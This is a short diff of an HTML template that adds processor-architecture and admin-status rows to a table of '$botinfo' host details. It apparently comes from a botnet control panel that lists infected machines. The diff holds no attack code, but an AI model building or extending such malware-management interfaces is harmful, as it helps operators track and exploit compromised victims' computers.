@@ -26,12 +26,26 @@
                          <td>{$botinfo.computrername}</td>
                      </tr>
                      <tr>
+                         <td>Processor Architecture</td>
+                         <td>{$botinfo.architecture}</td>
+                     </tr>
+                     <tr>
                          <td>CPU Model</td>
                          <td>{$botinfo.cpu}</td>
                      </tr>
                      <tr>
                          <td>GPU Model</td>
                          <td>{$botinfo.gpu}</td>
+                     </tr>
+                     <tr>
+                         <td>Admin</td>
+                         <td>
+                             {if $botinfo.isadmin == "true"}
+                                 <img src="{$includeDir}assets/img/checked.svg">
+                             {else}
+                                 <img src="{$includeDir}assets/img/error.svg">
+                             {/if}
+                         </td>
                      </tr>
                      <tr>
                          <td>Installed Ram</td>
